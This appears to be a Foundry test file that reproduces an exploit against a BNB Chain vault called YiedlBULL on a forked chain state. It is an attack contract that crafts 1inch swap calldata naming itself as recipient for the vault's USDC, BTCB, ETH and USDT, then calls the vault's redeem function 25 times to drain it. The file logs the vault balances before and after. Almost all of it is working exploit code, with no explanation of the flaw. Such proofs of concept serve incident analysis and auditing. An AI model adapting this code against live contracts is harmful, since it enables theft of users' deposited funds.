// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";

import "./ISpotVault.sol";
import "./IAggregation.sol";

WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
IERC20 constant ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IAggregation constant ONE_INCH_AGG_ROUTER = IAggregation(
    payable(0x1111111254EEB25477B68fb85Ed929f73A960582)
);

ISpotVault constant YiedlBULL = ISpotVault(
    payable(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4)
);

contract YieldHack is Test {
    address admin;

    constructor() payable {
        admin = msg.sender;
    }

    function fuckyou() public {
        bytes[] memory dataList = new bytes[](11);
        uint256[] memory pools = new uint256[](1);
        pools[
            0
        ] = 28948022309329048857350594136651893637891169795467361725136627244723734772827;
        dataList[0] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            address(this), // recipient
            address(USDC), // srcToken
            2379098196712524646162, // amount
            0, // minReturn
            pools
        );

        pools[
            0
        ] = 28948022309329048857350594135968575911172281388296638049447197314275709206658;
        dataList[1] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            address(this), // recipient
            address(BTCB), // srcToken
            16399732586103629, // amount
            0, // minReturn
            pools
        );

        pools[
            0
        ] = 28948022309329048857350594136076890004755093450729657598371073172666212569020;
        dataList[2] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            address(this), // recipient
            address(ETH), // srcToken
            262138432554380692, // amount
            0, // minReturn
            pools
        );

        pools[
            0
        ] = 28948022309329048857350594135539290707713861413663468977256237322890633743790;
        dataList[3] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            address(this), // recipient
            address(USDT), // srcToken
            552059946771887847686, // amount
            0, // minReturn
            pools
        );

        dataList[4] = new bytes(0);
        dataList[5] = new bytes(0);
        dataList[6] = new bytes(0);
        dataList[7] = new bytes(0);
        dataList[8] = new bytes(0);
        dataList[9] = new bytes(0);
        dataList[10] = new bytes(0);

        for (uint i = 0; i < 25; i++) {
            console2.log(
                "Attacker BNB balance before: ",
                address(this).balance / 1e18
            );
            YiedlBULL.redeem(0, address(USDT), 0, dataList, false);
        }
    }

    receive() external payable {}
}

contract YieldTest is Test {
    uint256 USDC_WEI;
    uint256 BTCB_WEI;
    uint256 ETH_WEI;
    uint256 USDT_WEI;

    function setUp() public {
        vm.createSelectFork("bsc", 38_126_754 - 1);
        deal(address(this), 0 ether);
    }

    function showBalance() public {
        USDC_WEI = USDC.decimals();
        BTCB_WEI = BTCB.decimals();
        ETH_WEI = ETH.decimals();
        USDT_WEI = USDT.decimals();

        emit log_named_decimal_uint(
            "YiedlBULL USDC balance",
            USDC.balanceOf(address(YiedlBULL)),
            USDC_WEI
        );
        emit log_named_decimal_uint(
            "YiedlBULL BTCB balance",
            BTCB.balanceOf(address(YiedlBULL)),
            BTCB_WEI
        );
        emit log_named_decimal_uint(
            "YiedlBULL ETH balance",
            ETH.balanceOf(address(YiedlBULL)),
            ETH_WEI
        );
        emit log_named_decimal_uint(
            "YiedlBULL USDT balance",
            USDT.balanceOf(address(YiedlBULL)),
            USDT_WEI
        );
        console.log("---------------------------");
    }

    function testExploit() public {
        showBalance();

        YieldHack hacker = new YieldHack();
        hacker.fuckyou();

        showBalance();
    }
}
